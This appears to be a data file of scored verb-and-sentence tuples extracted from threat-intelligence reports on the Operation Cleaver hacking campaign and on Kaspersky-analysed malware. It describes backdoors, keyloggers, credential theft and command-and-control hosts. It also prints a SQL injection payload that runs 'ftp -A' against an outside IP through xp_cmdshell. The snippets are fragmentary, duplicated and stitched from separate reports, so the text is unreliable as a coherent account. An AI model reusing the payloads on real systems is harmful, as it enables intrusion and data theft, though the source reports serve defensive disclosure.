(cont.)</heading>\n\n\n<figure></figure>\n\n          <caption>Figure 6: Shell Creator 2 alerts the user in red when the IP being used can be sourced to Iran.</caption>\n\n\n<figure></figure>\n\n                                          \n              <caption>Figure 7: Shell Creator 2 notifies the user in green when their source IP address is not Iran.</caption>\n\n</section>                               \n\n<section>\n  <heading>Net Crawler</heading>\n                       \n  Net Crawler is a tool developed in C# that exhibits worm-like behavior in order to gather cached\n  credentials from any and all accessible computers on an infected network')(1.0, 'capture', ' When executed, it will capture the user’s keystrokes and save\nthem to a location which PVZ bot then exfiltrates')(0.5454545454545454, 'save', ' When executed, it will capture the user’s keystrokes and save\nthem to a location which PVZ bot then exfiltrates')(0.75, 'supplementing', ' These tools are often support tools, either\n  monitoring the activity of other tools or supplementing the function of other tools gathering\n  information during the infiltration process')(1.0, 'monitoring', ' These tools are often support tools, either\n  monitoring the activity of other tools or supplementing the function of other tools gathering\n  information during the infiltration process')(0.3333333333333333, 'executed', ' When executed, both applications are\n  written to a temporary directory and executed')(0.13333333333333333, 'connect', '\n  exe ,taskkill.exe$$/F /PID {pid},00:29,00:35\n  %%\n  ##\n</list>\n  This configuration executes zhCat to connect back to srv01.microsoftwindowsupdate(dot)net (a\n  deceptive domain owned by this group with falsified Whois data attributing to Microsoft Investor\n  Relations) with XORed communication using the HTTP protocol on TCP port 443')(1.0, 'executes', '\n  exe ,taskkill.exe$$/F /PID {pid},00:29,00:35\n  %%\n  ##\n</list>\n  This configuration executes zhCat to connect back to srv01.microsoftwindowsupdate(dot)net (a\n  deceptive domain owned by this group with falsified Whois data attributing to Microsoft Investor\n  Relations) with XORed communication using the HTTP protocol on TCP port 443')(1.0, 'download', ' These\nFTP servers were also observed during the infection process, as infected computers were\noften instructed to download additional files from these FTP servers, including backdoors and\npivoting tools')(0.8, 'decide', '\n\n  The following is a list of supported commands that TinyZBot responds to:\n<list>     \n  COPY                                        \n  REPLACE                                     \n  DELETE                                      \n  UPLOAD                                      \n  FUPLOAD                                     \n  CLEARFILES                                  \n  CLEAROUPUTFOLDER                            \n  SAVECONFIG                                  \n  SAVETOCFGFILE                               \n  RESTART                       \n  RestartForce\n  KILL           \n  DEEPKILL       \n  EXIT           \n  EXITFORCE      \n  RUNAVDETECTOR  \n  RUNWAIT        \n  RUNCMD         \n  UCMD           \n  GETINFO        \n  GETSCREENSHOTHQ\n  GETSCREENSHOT   \n  CREATEUPLOADLIST\n  FORCERESTART    \n  FORCEEXIT       \n  UNLOADMODULE    \n  RELOADMODULE    \n  LOADMODULE      \n  UNLOADM         \n  RELOADM         \n  REMOVEM\n  UNLOADALL\n  RELOADALL\n  ADDSEC\n  REMSEC\n  ADDKV\n  CHGKV\n  REMKV\n  ADDK\n  REMOVEK\n</list>\n\n  Commands such as GETINFO are often run on newly infected systems, as they decide whether\n  the infection has hit the correct target')(0.375, 'responds', '\n\n  The following is a list of supported commands that TinyZBot responds to:\n<list>     \n  COPY                                        \n  REPLACE                                     \n  DELETE                                      \n  UPLOAD                                      \n  FUPLOAD                                     \n  CLEARFILES                                  \n  CLEAROUPUTFOLDER                            \n  SAVECONFIG                                  \n  SAVETOCFGFILE                               \n  RESTART                       \n  RestartForce\n  KILL           \n  DEEPKILL       \n  EXIT           \n  EXITFORCE      \n  RUNAVDETECTOR  \n  RUNWAIT        \n  RUNCMD         \n  UCMD           \n  GETINFO        \n  GETSCREENSHOTHQ\n  GETSCREENSHOT   \n  CREATEUPLOADLIST\n  FORCERESTART    \n  FORCEEXIT       \n  UNLOADMODULE    \n  RELOADMODULE    \n  LOADMODULE      \n  UNLOADM         \n  RELOADM         \n  REMOVEM\n  UNLOADALL\n  RELOADALL\n  ADDSEC\n  REMSEC\n  ADDKV\n  CHGKV\n  REMKV\n  ADDK\n  REMOVEK\n</list>\n\n  Commands such as GETINFO are often run on newly infected systems, as they decide whether\n  the infection has hit the correct target')(0.23333333333333334, 'include', '\n •\t Customized private tools with functions that include ARP poisoning, encryption, credential\n    dumping, ASP.NET shells, web backdoors, process enumeration, WMI querying, HTTP and\n    SMB communications, network interface sniffing, and keystroke logging')(0.5555555555555556, 'gained', ' They gained access to PayPal\n and Go Daddy credentials allowing them to make fraudulent purchases and allowed unfettered\n access to the victim’s domains')(0.42857142857142855, 'allowed', ' They gained access to PayPal\n and Go Daddy credentials allowing them to make fraudulent purchases and allowed unfettered\n access to the victim’s domains')(0.5882352941176471, 'allowing', ' They gained access to PayPal\n and Go Daddy credentials allowing them to make fraudulent purchases and allowed unfettered\n access to the victim’s domains')(0.5555555555555556, 'executing', '\nThe command and control still supports upgrading, downloading, and executing of applications, as\nwell as executing batch scripts')(0.2, 'upgrading', '\nThe command and control still supports upgrading, downloading, and executing of applications, as\nwell as executing batch scripts')(0.4, 'automate', '\n</section>\n\n<section>\n<heading>zhMimikatz and MimikatzWrapper</heading>\nTwo similar applications were developed by Operation Cleaver in order automate the execution\nof Mimikatz')(0.8461538461538461, 'is', '\n</section>\n\n<section>\n  <heading>Jasus</heading>\n                                 \n  Jasus is an ARP cache poisoner developed by the Operation Cleaver team')(0.5555555555555556, 'allowing', ' Fully compromised VPN credentials meant their entire remote access infrastructure\n and supply chain was under the control of the Cleaver team, allowing permanent persistence\n under compromised credentials')(0.8, 'meant', ' Fully compromised VPN credentials meant their entire remote access infrastructure\n and supply chain was under the control of the Cleaver team, allowing permanent persistence\n under compromised credentials')(0.47058823529411764, 'targeted', ' The attackers targeted research\n efforts, student information, student housing, and financial aid systems')(0.8, 'detect', ' A method was added to detect what security related\n  software is installed')(0.5, 'underwent', ' The email data exfiltration method also underwent modification\n to be activated at a scheduled interval')(0.6666666666666666, 'uses', '\n  menrad(dot)de/js/jquery/default.aspx and the command and control protocol only uses\n  HTTP')(0.4166666666666667, 'includes', '\n\nThe PVZ tool chain includes a variety of functionality, such as HTTP command and control\ncommunications with an ASPX server-side component, a denial of service tool they developed, and\nthe public project named XYNTService used to run ordinary applications as services')(0.7272727272727273, 'use', ' This allowed the attackers to use\ninfrastructure that was not theirs to exfiltrate information')(0.8461538461538461, 'use', ' Recent versions use the resume-\n  based methods reported in the Initial Compromise sections')(0.7777777777777778, 'display', ' If it is unable to connect to the Internet,\n it will display a window to input proxy information')(0.7777777777777778, 'parses', '\n</section>\n\n<section>\n  <heading>zhMimikatz</heading>\n  zhMimikatz executes the correct version of Mimikatz for the current system, and parses the results\n  for any cached credentials')(0.7, 'executes', '\n</section>\n\n<section>\n  <heading>zhMimikatz</heading>\n  zhMimikatz executes the correct version of Mimikatz for the current system, and parses the results\n  for any cached credentials')(0.46153846153846156, 'create', '\n  \n  When a positive result has been achieved, it will create a copy of itself with a modified\n  configuration stored as a PE resource, then send and execute the copy utilizing PsExec')(0.6666666666666666, 'send', '\n  \n  When a positive result has been achieved, it will create a copy of itself with a modified\n  configuration stored as a PE resource, then send and execute the copy utilizing PsExec')(0.4, 'execute', '\n  \n  When a positive result has been achieved, it will create a copy of itself with a modified\n  configuration stored as a PE resource, then send and execute the copy utilizing PsExec')(0.2857142857142857, 'launching', ' This can involve launching attacks from the\ncompromised computer, or simply abusing access once it has been gained')(0.25, 'abusing', ' This can involve launching attacks from the\ncompromised computer, or simply abusing access once it has been gained')(0.8333333333333334, 'connect', ' This allows them\n to easily connect to RDP servers inside the networks of their victims')(0.5217391304347826, 'replaced', ' The\n  backdoor additionally replaced the original malicious executable with an appropriately named\n  image file and padded the image file with null bytes in order to mirror the original file size')(0.4666666666666667, 'padded', ' The\n  backdoor additionally replaced the original malicious executable with an appropriately named\n  image file and padded the image file with null bytes in order to mirror the original file size')(0.6875, 'create', ' Its\n  main purpose is to create a channel that is capable of transporting information over the network')(0.875, 'is', ' The primary positive attribute\n  of Jasus is its poor detection ratio by the antivirus industry')(0.75, 'has', '\n   \n  Csext also has email functionality similar to TinyZBot')(0.8461538461538461, 'utilizes', ' The following is a list of supported features:\n<list>\n  •   SMTP exfiltration\n  •   Log keystrokes\n  •   Monitor clipboard activity\n  •   Enable a SOAP-based command and control channel\n  •   Self-updating\n  •   Download and execute arbitrary code\n  •   Capture screenshots        \n  •   Extract saved passwords for Internet Explorer\n  •   Install as a service\n  •   Establish persistence by shortcut in startup folder\n  •   Provide unique malware campaign identifiers for tracking and control purposes\n  •   Deceptive execution methods\n  •   Dynamic backdoor configuration\n  •   FTP exfiltration\n  •   Security software detection\n  •   Ability to disable Avira antivirus\n  •   Ability to modify PE resources\n  •   Dynamic plugin structure\n</list>\n</section>\n<footer>47</footer>\n\x0c \n<header>\nOPERATION\nCLEAVER                                                                                                                               <figure>5468696e6b204576696c2c20446f20476f6f64</figure>\n\n</header>\n\n<section>\n<heading>TinyZBot Command and Control Protocol</heading>\n\nThe command and control mechanism for TinyZBot utilizes SOAP communicating over HTTP')(0.75, 'evaded', ' To date it has successfully evaded detection by existing security\n  technologies')(0.6, 'scan', ' Once this is complete, it\n  then continues to scan a set of configured IP addresses on the local subnet to determine which\n  IP addresses have SMB related ports open')(0.3888888888888889, 'hosted', '\n\nThe following IP addresses hosted FTP servers that were used in the infection of targets or in\nthe exfiltration of information')(0.3125, 'enable', ' This feature can be abused to enable a reverse connecting shell, which can be\nused to remotely control a target')(0.6, 'stealing', ' Operation Cleaver has a strong focus on stealing\n  confidential/privileged information, and they have utilized a few methods in order to facilitate this\n  objective')(0.4090909090909091, 'does', '\n\n\n<figure></figure>\n\n                       <caption>Figure 19: GET request to www.microsoft.com fakes the résumé submission.</caption>\n        \n  When the victim hits submit, the résumé submitter does a GET request to microsoft.com in order\n  to make it seem like it is submitting something, then claims success')(0.8333333333333334, 'is', '\n\n</section>\n\n\n<footer>46</footer>\n\x0c\n<header>#OPCLEAVER</header>\n\n<section>\n  <heading>PERSISTENCE</heading>\n  Persistence is the means of maintaining access to a compromised network')(0.8181818181818182, 'execute', ' They\n replace the existing Notepad.exe on the infected machine, and when run they call out to a\n remote server and execute any shell code returned by the remote server')(0.47619047619047616, 'use', ' In\norder to take advantage of this job opportunity, the victim\nneeded to use the fake résumé submission application\nsupplied by the malicious recruiter')(0.75, 'is', '\n</section>\n<section>\n\n  <heading>TinyZBot</heading>\n  TinyZBot is a backdoor developed in C#')(0.8, 'executes', '\n\n</section>\n\n\n<footer>56</footer>\n\x0c\n<header>#OPCLEAVER</header>\n\n<section>\n  <heading>PVZ (cont.)</heading>\n  The components are as follows:\n<list>\n  •   PVZ-In\n  •   PVZ-Out\n  •   Syn Flooder\n  •   LoggerModule\n  •   XYNTService\n  •   Jasus\n</list>\n  XYNTService was not developed by the Cleaver team, but instead is a publicly available project\n  which executes an executable as a service')(0.9090909090909091, 'is', '\n</section>\n\n<section>\n<heading>SYN Flooder</heading>\nSYN Flooder is a simple network based denial of service tool')(0.25, 'upload', ' This allowed them to use existing\ncommand line utilities available on their targets in order to upload information')(0.7, 'use', ' This allowed them to use existing\ncommand line utilities available on their targets in order to upload information')(0.8, 'served', '\n\nThe IP address 78.109.194.114 served as a source for one of the primary attackers')(0.4230769230769231, 'including', '\n\n  The following is a breakdown by country of which industries were targeted and/or victimized:\n\n<list>\n         Canada                             \n         - Energy & Utilities                        \n         - Oil & Gas         \n         - Hospitals                        \n                                            \n                            \n         China                              \n         - Aerospace\n                        \n                 \n         England\n         - Education                  \n              \n\n         France                             \n         - Oil & Gas                        \n                       \n\n         Germany                      \n         - Telecommunications               \n                                      \n                   \n         India                              \n         - Education                        \n                                            \n                                            \n         Israel                             \n         - Aerospace\n         - Education\n\n         \n         Kuwait              \n         - Oil & Gas         \n         - Telecommunications\n\n\n         Mexico            \n         - Oil & Gas         \n\n\n         Pakistan            \n         - Airports          \n         - Hospitals\n         - Technology        \n         - Airlines          \n\n                    \n         Qatar\n         - Oil & Gas\n         - Government           \n         - Airlines\n                    \n                    \n         Saudi Arabia        \n         - Oil & Gas         \n         - Airports          \n\n\n         South Korea\n         - Airports\n         - Airlines\n         - Education\n         - Technology\n         - Heavy Manufacturing\n\n\n         Turkey\n         - Oil & Gas\n\n\n         United Arab Emirates\n         - Government\n         - Airlines\n\n\n         United States\n         - Airlines\n         - Education\n         - Chemicals\n         - Transportation\n         - Energy & Utilities\n         - Military/Government\n         - Defense Industrial Base\n</list>                                                                                                       \n<footer>13</footer>\n\x0c\n<header>\n\nOPERATION\nCLEAVER                                                                                                                               <figure>5468696e6b204576696c2c20446f20476f6f64</figure>\n\n</header>\n\n Cleaver’s level of access into each organization varied greatly, including completely compromised\n systems and networks, Active Directory domain controllers and credentials, compromised data\n repositories and stolen VPN credentials')(0.8095238095238095, 'combined', ' In order to infect users, they combined the original Easy Resume Creator\n  Pro product with malware by using a binder they developed internally named Binder_1')(0.45454545454545453, 'is', '\n</section>\n\n<section>\n  <heading>PVZ-Out</heading>\n  PVZ-Out is the other half of the command and control channel, primarily uploading results of\n  commands and keystroke logging data to a remote server')(1.0, 'allows', ' Its main functionality allows for a client and server communication channel, allowing\nfor information to be transported over the network simply')(0.6428571428571429, 'allowing', ' Its main functionality allows for a client and server communication channel, allowing\nfor information to be transported over the network simply')(0.7727272727272727, 'includes', ' This group includes the results of the Shell Creator mentioned in the\n  Attribution section, as well as ASPX backdoors used by Nesha')(0.8, 'impacted', ' These attacks were debilitating and\nimpacted the availability of online banking services')(0.15789473684210525, 'allows', ' The exploit allows for\nescalation of privileges on unpatched Windows operating systems from an unprivileged user to\nkernel-level privilege')(0.2916666666666667, 'allows', ' This increase in privileges\nallows for the attacker to gain access to privleged areas of the operating system as well as to\ninfect other computers on the target network')(0.6666666666666666, 'infect', ' This increase in privileges\nallows for the attacker to gain access to privleged areas of the operating system as well as to\ninfect other computers on the target network')(1.0, 'gain', ' This increase in privileges\nallows for the attacker to gain access to privleged areas of the operating system as well as to\ninfect other computers on the target network')(0.5, 'know', '\n The AppUsageId (at this point named AppType) was an identifier used by this organization in\n order to differentiate between targets infected with TinyZBot, meaning they could effectively\n run multiple campaigns using the same command and control server and know which target\n was infected')(0.36363636363636365, 'run', '\n The AppUsageId (at this point named AppType) was an identifier used by this organization in\n order to differentiate between targets infected with TinyZBot, meaning they could effectively\n run multiple campaigns using the same command and control server and know which target\n was infected')(0.15151515151515152, 'differentiate', '\n The AppUsageId (at this point named AppType) was an identifier used by this organization in\n order to differentiate between targets infected with TinyZBot, meaning they could effectively\n run multiple campaigns using the same command and control server and know which target\n was infected')(0.5, 'using', '\n    \n  We observed the Operation Cleaver team using Cain & Abel for extracting credentials from caches\n  and the network when they are confident that there is little to no antivirus protection on the infected\n  target')(0.5, 'is', '\n\n\n<footer>58</footer>\n\x0c\n<header>#OPCLEAVER</header>\n\n\n  We have seen wndTest communicate with the following servers:\n<list>\n  •   209.208.97.44, Orlando, Florida, USA, www.lat(dot)am\n  •   23.238.17.181, Tulsa, Oklahoma, USA, regulatorfix(dot)com\n  •   209.208.97.44, Orlando, Florida, USA, www.asiess(dot)com\n  •   198.50.100.210, Quebec, Canada, halon(dot)com.br\n  •   207.182.142.68, Columbus, Ohio, USA\n  •   95.211.191.247, Amsterdam, Noord-Holland, Netherlands\n</list>\n</section>\n\n<section>\n  <heading>Csext</heading>\n  Csext is a backdoor application developed in C# which runs as a service')(0.14285714285714285, 'runs', '\n\n\n<footer>58</footer>\n\x0c\n<header>#OPCLEAVER</header>\n\n\n  We have seen wndTest communicate with the following servers:\n<list>\n  •   209.208.97.44, Orlando, Florida, USA, www.lat(dot)am\n  •   23.238.17.181, Tulsa, Oklahoma, USA, regulatorfix(dot)com\n  •   209.208.97.44, Orlando, Florida, USA, www.asiess(dot)com\n  •   198.50.100.210, Quebec, Canada, halon(dot)com.br\n  •   207.182.142.68, Columbus, Ohio, USA\n  •   95.211.191.247, Amsterdam, Noord-Holland, Netherlands\n</list>\n</section>\n\n<section>\n  <heading>Csext</heading>\n  Csext is a backdoor application developed in C# which runs as a service')(0.8823529411764706, 'relied', ' Its method of exfiltrating the logged keystrokes\n relied upon a hardcoded email address stored in the binary')(0.4117647058823529, 'allowed', '\n\n  The version compiled on June 23, 2014, added functionality which allowed screenshots of the\n  desktop to be taken')(0.8333333333333334, 'is', '\n  </section>\n\n  <section>\n  <heading>EXFILTRATION</heading>\n  \n  Exfiltration is the process of moving information to an external site')(0.6666666666666666, 'conducting', ' They were observed conducting SQL injection attacks')(0.8333333333333334, 'included', '\n Compromised network infrastructure included Cisco VPNs as well as Cisco switches and routers')(0.36363636363636365, 'utilized', '\n   \n  <figure></figure>\n\n                     <caption>Figure 24: The ASPX backdoor named “Zh0uSh3ll”, allowing SQL queries.</caption>\n\n\n\n\n<footer>55</footer>\n\x0c\n<header> \nOPERATION\nCLEAVER                                                                                                                               <figure>5468696e6b204576696c2c20446f20476f6f64</figure>\n\n</header>\n\n<figure></figure>\n                      <caption>Figure 25: The ASPX backdoor named “Zh0uSh3ll”, allowing file</caption>\n\n\n\n This organization utilized backdoors which masqueraded as varying versions of Notepad')(0.8571428571428571, 'used', '\nSQL injection payloads used by this organization have been double encoded')(0.8571428571428571, 'was', '\n\n  The IP address 159.253.144.209 was a source for a secondary attacker in various\n  compromises')(0.8947368421052632, 'determine', ' When executed, they determine which version\nof Mimikatz to use based on whether the computer’s version of Windows is 32-bit or 64-bit')(0.5833333333333334, 'installs', '\nsp_configure%20@b2,%201;RECONFIGURE;--%20\n</list>\nThen connect outbound via anonymous FTP:\n<list>\nhttp://localhost/Demos/demo.cfm?Edit%26ID=111;declare%20@b1%20varchar(8000);set%20@\nb1=%20ftp -A 108.175.152.230;%20exec%20master..xp_cmdshell%20@b1--%20\n</list>\n</section>\n\n<section>\n<heading>Spear-Phishing Campaign</heading>\nUsing messaging methods such as email, attackers can social engineer users into downloading\nand executing software, which quietly installs malware alongside of the desired program')(0.2857142857142857, 'allowed', '\n\n The next day, April 25, 2013, a new version was compiled which allowed for self-deletion')(0.8181818181818182, 'conducted', '     \n                         \n  Operation Cleaver has, over the past several years, conducted a significant global surveillance\n  and infiltration campaign')(0.125, 'communicate', '\n</section>\n\n<section>\n  <heading>PVZ-In</heading>      \n  The purpose of PVZ-In is to communicate with a command and control server')(0.16666666666666666, 'used', ' There are limitless\n  methods of persistence; the following are techniques and tools for persistence used by Cleaver')(0.4375, 'generates', ' The creator generates\nan ASPX web shell using user input as well as a collection of templates')(0.2727272727272727, 'recovered', '\n   \n  An ASPX backdoor named Zh0uSh311 was located on live servers as well as recovered fro\n  a staging server')(0.2857142857142857, 'records', '\n</section>\n\n<section>\n<heading>Logger Module</heading>\nLogger Module observes the user’s actions and records them to a file')(1.0, 'observes', '\n</section>\n\n<section>\n<heading>Logger Module</heading>\nLogger Module observes the user’s actions and records them to a file')(0.46153846153846156, 'include', ' The recorded actions include\nmouse clicks, active windows, keypresses, as well as clipboard data')(0.8888888888888888, 'mentioned', ' The\n  operators of the blog IranRedLine.org, which comments on Iran’s nuclear weapons efforts, has\n  mentioned in multiple posts having been the target of debilitating brute-force authentication attacks\n  from IP addresses registered to the same Tarh Andishan team found in Cleaver')(0.5333333333333333, 'use', '\n\n On the server side, we can see our message has been received:\n\n<figure></figure>\n\n\n If stricter egress filtering is enabled, the attackers can use zhCat to also XOR encrypt the traffic\n with a shared key')(0.35714285714285715, 'queries', ' The TinyZBot queries the server in\n  order to enumerate all files currently available to it')(0.75, 'make', ' The purpose is deception, to make\n  the binder indistinguishable from the desired application')(0.3548387096774194, 'include', '\n\n</section>\n<section>\n <heading>Iran’s Cyber Hacking Skills Have Evolved</heading>\n •\t Initial compromise techniques include SQL injection, web attacks, and creative deception-\n    based attacks – all of which have been implemented in the past by Chinese and Russian\n    hacking teams')(0.6666666666666666, 'exposing', ' Stuxnet was an\neye-opening event for Iranian authorities, exposing them to the\nworld of physical destruction via electronic means')(0.8666666666666667, 'has', '\n\n<figure></figure>\n\n                          \n On the server side, we can see this information being received:\n      \n<figure></figure>\n\n zhCat has a variety of other features such as port mirroring as well as traffic redirecting')(1.0, 'leveraged', ' In May 2014, evidence emerged of a highly targeted waterhole attack that leveraged social\nmedia, dubbed Operation Newscaster, which was uncovered by iSight Partners')(0.8181818181818182, 'include', ' These\n versions began to include a new method of installing as a service')(0.9047619047619048, 'is', '\n\nPivoting is the process of leveraging access from one compromised computer in order to gain\naccess to additional systems on the target network')(0.6666666666666666, 'added', ' Avira antivirus was specifically targeted and disabled, due to its detection of\n  the new keystroke logger module added in this version')(0.782608695652174, 'include', '\n\n Compromised systems include Microsoft Windows web servers running IIS and ColdFusion,\n Apache with PHP, many variants of Microsoft Windows desktops and servers, and Linux servers')(0.75, 'checks', '\n<list>                                                                                          \n        • Teledyne-Jobs.com\n        • Doosan-Job.com\n        • NorthropGrumman.net\n</list>\n<figure></figure>\n<caption>Figure 16: When the résumé submitting\napplication is executed, a splash screen is\ndisplayed.</caption>  \n\n At this point, the résumé submission application checks the\n Internet connection')(0.7692307692307693, 'make', '\n\n\n\n<footer>57</footer>\n\x0c\n<header> \nOPERATION\nCLEAVER                                                                                                                               <figure>5468696e6b204576696c2c20446f20476f6f64</figure>\n\n</header>\n\nData uploaded is often compressed, which can make it more difficult to detect the exfiltration of\nsensitive information')(0.8181818181818182, 'is', '\n</section>\n<section>\n<heading>SQL Injection</heading>\nSQL injection is a very common and simple attack method')(0.75, 'see', '\n\n<figure></figure>\n</section>\n\n<footer>43</footer>\n\x0c\n<header>\nOPERATION\nCLEAVER                                                                                                                               <figure>5468696e6b204576696c2c20446f20476f6f64</figure>\n\n</header>\n<section>\n <heading>zhCat (cont.)</heading>\n If we observe the network communications during this transfer, we can see the following HTTP\n POST request')(0.75, 'is', '\n</section>\n\n<section>\n<heading>SOAP</heading>\nSOAP is a sub-protocol communicated via HTTP')(0.48148148148148145, 'include', ' Famous\nexamples of these efforts include industrial sabotage via\nStuxnet (2009 - 2010), and espionage with Duqu (2009 - 2011)\nas well as Flame (2012)')(0.5, 'abused', '\n</section>\n\n\n\n<footer>45</footer>\n\x0c\n<header>\nOPERATION\nCLEAVER                                                                                                                               <figure>5468696e6b204576696c2c20446f20476f6f64</figure>\n\n</header>\n\n<section>\n<heading>SMTP</heading>\nEarly Cleaver operations abused SMTP in order to exfiltrate information')(1.0, 'connect', ' This clever scheme makes sure the\n malware can connect to the command and control server,\n and increases the chances that domain credentials are\n cached on the now infected machine')(0.4444444444444444, 'execute', ' NetCat has an option when being\ncompiled to enable or disable the ability for NetCat to execute a command after the connection\nis established')(0.8333333333333334, 'used', ' The following is the key used for XOR\n encryption:\n<list>\n     Sorry! The handle to file %s is not a valid handle any more.\\nSorry!\n             The handle to file %s is not a valid handle any more')(0.16666666666666666, 'install', ' These versions have the capability to install as a service')(0.6666666666666666, 'avoid', ' This was likely to avoid detonation-based detection engines')(0.8181818181818182, 'is', ' In this context, it is the process\n  of stealing information without being detected')(0.875, 'extract', '\n</section>\n<section>\n<heading>Cached Credential Dumping</heading>\nA very common method of pivoting on a predominantly Windows operating system based\nnetwork is to extract domain credentials which have been used on the compromised computer\nfrom a credential cache')(0.5, 'given', ' There are a few well-known tools which are capable of doing this given\nsufficient privileges on the infected host')(0.7, 'done', '\norg/” /></soap:Body></soap:Envelope>\n\nHTTP/1.1 200 OK\nCache-Control: private, max-age=0\nContent-Type: text/xml; charset=utf-8\nServer: Microsoft-IIS/7.5\nX-AspNet-Version: 2.0.50727\nX-Powered-By: ASP.NET\nDate: Mon, 06 Oct 2014 13:36:47 GMT\nContent-Length: 392\n\n</code>\n</section>\n\n<footer>48</footer>\n\x0c\n<header>#OPCLEAVER</header>\n<section>\n\n  <heading>TinyZBot Command and Control Protocol (cont.)</heading>\n  <code>\n  <?xml version=”1.0” encoding=”utf-8”?><soap:Envelope\n  xmlns:soap=”http://schemas.xmlsoap.org/soap/envelope/” xmlns:xsi=”http://www.w3.org/2001/\n  XMLSchema-instance”\n  xmlns:xsd=”http://www.w3.org/2001 XMLSchema”><soap:Body><GetServerTimeResponse xmlns=”http://\n  tempuri.org/”><GetServerTimeResult>2014-10-06T13:36:47.2193601Z</GetServerTimeResult></\n  GetServerTimeResponse></soap:Body></soap:Envelope>\n</code>\n\n  This is the first query done by a running TinyZBot instance, and needs to be done shortly before\n  most other queries, in order to update the dynamic password')(0.4, 'logging', ' As the\n  infected user is going through and filling out all this information, the malware is running in the\n  background, logging their keystrokes, retrieving their stored passwords, etc')(0.9259259259259259, 'is', '\n</section>\n\n\n\n<footer>40</footer>\n\x0c\n<header>#OPCLEAVER</header>\n\n<section>\n  <heading>MS08-067 Exploit</heading>\n\n  MS08-067 is a vulnerability in Microsoft Windows made popular by the Conficker worm which can\n  be exploited by a specially crafted packet to the operating system’s RPC network interface')(0.8333333333333334, 'utilized', ' Nesha often utilized web-based backdoors developed\n  in ASPX, PHP as well as ColdFusion')(0.5, 'starts', '\n</section>\n\n<section>\n<heading>Information Stealer</heading>\n<table>\nFilename      MD5                                  Link Time (UTC)           Linker\n\nDmaUp3.exe 864cd4a59215a7db2740dfbe4a648053 2012.04.30                       6.0\n                                                   00:25:59\n</table>\nThis module is relatively large (455Kb) and comes as a part of WinRar SFX file\nthat drops and starts the module from %APPDATA%\\Microsoft\\Display\\DmaUp3')(1.0, 'drops', '\n</section>\n\n<section>\n<heading>Information Stealer</heading>\n<table>\nFilename      MD5                                  Link Time (UTC)           Linker\n\nDmaUp3.exe 864cd4a59215a7db2740dfbe4a648053 2012.04.30                       6.0\n                                                   00:25:59\n</table>\nThis module is relatively large (455Kb) and comes as a part of WinRar SFX file\nthat drops and starts the module from %APPDATA%\\Microsoft\\Display\\DmaUp3')(1.0, 'steal', ' So far, the attackers can steal logins and pass-\nwords but to understand where they are from they must guess the string which\nproduced given hash')(0.1111111111111111, 'are', '\nThis smaller code section maintains similar functionality to the “worm” compo-\nnent:\n<list>\n•\t B\t ASICAPI window creation and update\n•\t \tVMWare detection/red pill\n•\t \tAV check\n<footer>\nTLP: Green\t                For any inquiries, please contact intelreports@kaspersky.com\n</footer>\n\x0c\n<header>68</header>\n\n\n•\t dmaup3.exe checks\n•\t proto.dat check\n•\t system information collection, encryption with\n      «ab911001f78ad31552e47205ecc46466» key and transfer to c2\n</list>\nHost package files detected as “Virus.Win32.Pioneer.dx” are infected legitimate\nfiles, that do not have any self\xadpropagation routines')(0.6666666666666666, 'retrieves', ' It is somewhat surprising that there is no rootkit\nfunctionality hiding this service:\n\n\n\n<footer>\nTLP: Green\t                 For any inquiries, please contact intelreports@kaspersky.com\n</footer>\n\x0c                                                                                 \n<header>69</header>\n\n<figure></figure>\n\n\nWhen loaded, the NDISKPRO.SYS driver hooks both INT 0x01 and INT 0xff, and\nretrieves keystroke data directly from port 0x60, the motherboard keyboard con-\ntroller itself')(0.25, 'loaded', ' It is somewhat surprising that there is no rootkit\nfunctionality hiding this service:\n\n\n\n<footer>\nTLP: Green\t                 For any inquiries, please contact intelreports@kaspersky.com\n</footer>\n\x0c                                                                                 \n<header>69</header>\n\n<figure></figure>\n\n\nWhen loaded, the NDISKPRO.SYS driver hooks both INT 0x01 and INT 0xff, and\nretrieves keystroke data directly from port 0x60, the motherboard keyboard con-\ntroller itself')(0.6666666666666666, 'detect', ' Another method to detect VM en-\nvironment is to check local network adapter’s IP address')(0.7142857142857143, 'check', ' Another method to detect VM en-\nvironment is to check local network adapter’s IP address')(0.631578947368421, 'delete', ' Then the module attempts to delete some other, prob-\nably older, components which might be present on the system')(0.18181818181818182, 'checks', ' First, it checks if cur-\nrent process is running in WOW64 environment')(0.8666666666666667, 'looks', ' A quote from Wikipedia:\n«Born in Yokohama Chinatown, Japan (though she is of partial Chinese descent)\nas Linn Minmei, Minmay moved in with her uncle Shaochin (少江) and aunt Feic-\nhun (慧中) on South Ataria Island in hopes of finding the path to fulfill her dream\nof becoming a star.»\n</section>\n\n<section>\n<heading>Trojan.Win32.Karba.e</heading>\n<table>\nFilename       MD5                                 Link Time (UTC)          Linker\n\nacroedit.exe   0fe3daf9e8b69255e592c8af97d24649    2013.10.29 00:21:48      6.0\n</table>\n</section>\n\n<section>\n<heading>Technical Notes</heading>\nThe trojan iterates through running processes and looks for security software\nbasing on executable filenames from the list below')(0.5, 'ensure', ' Malcode Technical Notes</heading>\n</section>\n<section>\n<heading>Small Downloader</heading>\n<table>\nFilename      MD5                                 Link Time (UTC)           Linker\n\nmsieckc.exe   41b816289a6a639f7f2a72b6c9e6a695    2012.04.11 18:31:48       6.0\n</table>\n</section>\n<section>\n<heading>Technical Details</heading>\nTo ensure only single instance of the module is running, the module verifies if\nsystem mutex named «132DF6E» exists')(0.5, 'drops', ' It drops\na keylogger')(0.375, 'maintains', ' This file is located in the same\ndirectory as the original dropper, which maintains persistence across reboots with\na simple addition to the HKCU run key')(0.44, 'collects', ' After that, the mod-\nule collects information about current system which includes the following:\n<list>\n•\t   \tNetwork adapter MAC address\n•\t   \tCPU Name and Identifier\n•\t   \tSystem default codepage\n•\t   \tWindows OS and Service Pack versions\n•\t    \tHostname and IP address\n•\t     \tLocal user name\n•\t      \tCached passwords from Internet Explorer 6/7/8/9 (Protected Storage and\n        IntelliForms)\n\n<footer>\nTLP: Green\t                For any inquiries, please contact intelreports@kaspersky.com\n</footer>\n\x0c                                                                                  \n<header>61</header>\n\n\n•\t Mozilla Firefox stored secrets (<12.0)\n•\t Chrome stored secrets\n•\t MS Outlook Express accounts\n•\t MS Windows Mail accounts\n•\t MS Windows Live Mail accounts\n•\t MS Outlook accounts (SMTP/IMAP/POP3/HTTP)\n•\t MSN Messenger\n•\t Gmail Notifier credentials\n•\t Google Desktop accounts\n•\t Google Talk accounts\n</list>\nIf the module reveals that current System default codepage is 0412 (Korean) it\nterminates')(1.0, 'download', '\n</section>\n\n<section>\n<heading>Selective Infector</heading>\n</section>\n<section>\n<heading>Technical Notes</heading>\nIgfxext.exe can download a file and drop it to 